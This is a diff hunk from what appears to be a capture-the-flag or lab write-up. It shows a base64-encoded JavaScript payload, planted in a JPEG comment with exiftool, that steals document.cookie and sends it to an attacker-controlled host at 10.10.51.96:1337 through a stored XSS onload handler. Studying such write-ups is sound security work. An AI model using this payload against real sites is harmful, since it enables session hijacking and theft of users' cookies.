@@ -71,7 +71,7 @@ The transformation of the payload to base64 and the final exiftool command to ad
 ```bash
 echo "var cookies = document.cookie ? encodeURIComponent(document.cookie) : 'nothing';var my_endpoint = 'http://10.10.51.96:1337/cookie/' + cookies + '.jpg';var my_img = '<img src=' + my_endpoint + '>';document.write(my_img);" | base64
 
-exiftool -comment="<img src='http://10.10.51.96:1337/3.jpg' oNlOaD=\"eval(atob('dmFyIGNvb2tpZXMgPSBkb2N1bWVudC5jb29raWUgPyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKSA6ICdub3RoaW5nJzt2YXIgbXlfZW5kcG9pbnQgPSAnaHR0cDovLzEwLjEwLjUxLjk2OjEzMzcvY29va2llLycgKyBjb29raWVzICsgJy5qcGcnO3ZhciBteV9pbWcgPSAnPGltZyBzcmM9JyArIG15X2VuZHBvaW50ICsgJz4nO2RvY3VtZW50LndyaXRlKG15X2ltZyk7Cg=='))\">" 3.jpg
+exiftool -comment="<img src='http://10.10.51.96:1337/hacked.jpg' oNlOaD=\"eval(atob('dmFyIGNvb2tpZXMgPSBkb2N1bWVudC5jb29raWUgPyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKSA6ICdub3RoaW5nJzt2YXIgbXlfZW5kcG9pbnQgPSAnaHR0cDovLzEwLjEwLjUxLjk2OjEzMzcvY29va2llLycgKyBjb29raWVzICsgJy5qcGcnO3ZhciBteV9pbWcgPSAnPGltZyBzcmM9JyArIG15X2VuZHBvaW50ICsgJz4nO2RvY3VtZW50LndyaXRlKG15X2ltZyk7Cg=='))\">" hacked.jpg
 ```
 
 We upload the image to the webapp and refresh the /portal/list.php page in order to execute the evaluation of our evil payload!
